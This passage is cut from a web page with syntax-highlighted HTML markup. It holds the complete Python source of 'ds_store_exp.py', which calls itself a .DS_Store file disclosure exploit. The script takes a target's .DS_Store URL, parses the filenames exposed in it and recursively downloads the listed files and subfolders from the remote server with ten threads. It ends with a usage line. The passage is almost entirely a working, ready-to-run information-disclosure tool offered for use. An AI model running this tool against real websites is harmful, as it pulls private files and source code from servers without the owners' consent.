"line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># LiJieJie    my[at]lijiejie.com    http://www.lijiejie.com</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">from</span> urlparse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> ds_store <span class="keyword">import</span> DSStore</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Scanner</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, start_url</span>):</span><br><span class="line">        <span class="variable language_">self</span>.queue = queue.Queue()</span><br><span class="line">        <span class="variable language_">self</span>.queue.put(start_url)</span><br><span class="line">        <span class="variable language_">self</span>.processed_url = <span class="built_in">set</span>()</span><br><span class="line">        <span class="variable language_">self</span>.lock = threading.Lock()</span><br><span class="line">        <span class="variable language_">self</span>.working_thread = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.dest_dir = os.path.abspath(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_valid_name</span>(<span class="params">self, entry_name</span>):</span><br><span class="line">        <span class="keyword">if</span> entry_name.find(<span class="string">&#x27;..&#x27;</span>) &gt;= <span class="number">0</span> <span class="keyword">or</span> \</span><br><span class="line">                entry_name.startswith(<span class="string">&#x27;/&#x27;</span>) <span class="keyword">or</span> \</span><br><span class="line">                entry_name.startswith(<span class="string">&#x27;\\&#x27;</span>) <span class="keyword">or</span> \</span><br><span class="line">                <span class="keyword">not</span> os.path.abspath(entry_name).startswith(<span class="variable language_">self</span>.dest_dir):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[ERROR] Invalid entry name: %s&#x27;</span> % entry_name)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                url = <span class="variable language_">self</span>.queue.get(timeout=<span class="number">2.0</span>)</span><br><span class="line">                <span class="variable language_">self</span>.lock.acquire()</span><br><span class="line">                <span class="variable language_">self</span>.working_thread += <span class="number">1</span></span><br><span class="line">                <span class="variable language_">self</span>.lock.release()</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">if</span> <span class="variable language_">self</span>.working_thread == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> url <span class="keyword">in</span> <span class="variable language_">self</span>.processed_url:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="variable language_">self</span>.processed_url.add(url)</span><br><span class="line">                base_url = url.rstrip(<span class="string">&#x27;.DS_Store&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">&#x27;http&#x27;</span>):</span><br><span class="line">                    url = <span class="string">&#x27;http://%s&#x27;</span> % url</span><br><span class="line">                schema, netloc, path, _, _, _ = urlparse(url, <span class="string">&#x27;http&#x27;</span>)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    response = requests.get(url, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="variable language_">self</span>.lock.acquire()</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;[ERROR] %s&#x27;</span> % <span class="built_in">str</span>(e))</span><br><span class="line">                    <span class="variable language_">self</span>.lock.release()</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                    folder_name = netloc.replace(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;_&#x27;</span>) + <span class="string">&#x27;/&#x27;</span>.join(path.split(<span class="string">&#x27;/&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(folder_name):</span><br><span class="line">                        os.makedirs(folder_name)</span><br><span class="line">                    <span class="keyword">with</span> <span class="built_in">open</span>(netloc.replace(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;_&#x27;</span>) + path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> outFile:</span><br><span class="line">                        <span class="variable language_">self</span>.lock.acquire()</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&#x27;[%s] %s&#x27;</span> % (response.status_code, url))</span><br><span class="line">                        <span class="variable language_">self</span>.lock.release()</span><br><span class="line">                        outFile.write(response.content)</span><br><span class="line">                    <span class="keyword">if</span> url.endswith(<span class="string">&#x27;.DS_Store&#x27;</span>):</span><br><span class="line">                        ds_store_file = BytesIO()</span><br><span class="line">                        ds_store_file.write(response.content)</span><br><span class="line">                        d = DSStore.<span class="built_in">open</span>(ds_store_file)</span><br><span class="line"></span><br><span class="line">                        dirs_files = <span class="built_in">set</span>()</span><br><span class="line">                        <span class="keyword">for</span> x <span class="keyword">in</span> d._traverse(<span class="literal">None</span>):</span><br><span class="line">                            <span class="keyword">if</span> <span class="variable language_">self</span>.is_valid_name(x.filename):</span><br><span class="line">                                dirs_files.add(x.filename)</span><br><span class="line">                        <span class="keyword">for</span> name <span class="keyword">in</span> dirs_files:</span><br><span class="line">                            <span class="keyword">if</span> name != <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">                                <span class="variable language_">self</span>.queue.put(base_url + name)</span><br><span class="line">                                <span class="comment"># try on child folder</span></span><br><span class="line">                                <span class="comment"># skip xxx.png</span></span><br><span class="line">                                <span class="keyword">if</span> <span class="built_in">len</span>(name) &lt;= <span class="number">4</span> <span class="keyword">or</span> name[-<span class="number">4</span>] != <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">                                    <span class="variable language_">self</span>.queue.put(base_url + name + <span class="string">&#x27;/.DS_Store&#x27;</span>)</span><br><span class="line">                        d.close()</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="variable language_">self</span>.lock.acquire()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[ERROR] %s&#x27;</span> % <span class="built_in">str</span>(e))</span><br><span class="line">                <span class="variable language_">self</span>.lock.release()</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                <span class="variable language_">self</span>.working_thread -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">self</span>):</span><br><span class="line">        all_threads = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            t = threading.Thread(target=<span class="variable language_">self</span>.process)</span><br><span class="line">            all_threads.append(t)</span><br><span class="line">            t.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;A .DS_Store file disclosure exploit.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;It parses .DS_Store and downloads file recursively.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Usage: python ds_store_exp.py https://www.example.com/.DS_Store&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    s = Scanner(sys.argv[<span class="number">1</span>])</span><br><span class="line">    s.scan()</span><br></pre></td></tr></table></figure>
